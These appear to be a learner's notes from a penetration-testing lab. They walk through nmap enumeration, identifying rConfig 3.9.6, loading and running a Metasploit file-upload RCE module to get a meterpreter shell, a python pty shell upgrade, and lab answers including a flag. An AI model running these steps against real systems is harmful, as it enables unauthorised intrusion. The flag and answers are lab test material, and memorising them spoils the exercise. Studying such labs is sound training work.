## Common Considerations
When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following:
- What distribution of Linux is the system running?
- What shell & programming languages exist on the system?
- What function is the system serving for the network environment it is on?
- What application is the system hosting?
- Are there any known vulnerabilities?

## Gaining a Shell Through Attacking a Vulnerable Application
#### Enumerate the Host
```shell
$ nmap -sC -sV 10.129.201.101

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

Considering we can see the system is listening on ports 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`), and 21 (`FTP`), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack (`Apache 2.4.6` and `PHP 7.2.34` ) and the distribution of Linux running on the system (`CentOS`).

We should consider trying to access the IP trhough a Browser:

#### rConfig Management Tool
![[Pasted image 20250927121504.png]]

Here we discover a network configuration management tool called [rConfig](https://www.rconfig.com/). This application is used by network & system administrators to automate the process of configuring network appliances. As pentesters, finding a vulnerability in this application would be considered a very critical discovery.

## Discovering a Vulnerability in rConfig
Take a close look at the bottom of the web login page, and we can see the rConfig version number (`3.9.6`). We should use this information to start looking for any `CVEs`, `publicly available exploits`, and `proof of concepts` (`PoCs`).

![[Pasted image 20250927121556.png]]

We can also use Metasploit's search functionality to see if any exploit modules can get us a shell session on the target.
#### Search For an Exploit Module

```shell-session
msf6 > search rconfig
```

There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their [repos on github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). We could do an even more specific search using a search engine: `rConfig 3.9.6 exploit metasploit github`
This search can point us to the source code for an exploit module called `rconfig_vendors_auth_file_upload_rce.rb`.

```shell-session
$ locate exploits

/opt/metasploit/modules/exploits 

Here are located exploit and we can add exploits there from Rapid7 github repo
```

We can copy the code into a file and save it in `/usr/share/metasploit-framework/modules/exploits/linux/http` similar to where they are storing the code in the GitHub repo

## Using the rConfig Exploit and Gaining a Shell

```shell
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

Set the right options
#### Execute the Exploit

```shell
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

meterpreter >
```

## Spawning a TTY Shell with Python

```shell
meterpreter > shell

whoami
apache

python -c 'import pty; pty.spawn("/bin/sh")'
or
python3 -c 'import pty; pty.spawn("/bin/sh")'

sh-4.2$ whoami
apache
```


### Questions

1. What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?
	 `php`

2.   Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
	Same exploit as above with Arbitrary File Upload on rConfig. 
	Flag: `edgerouter-isp`


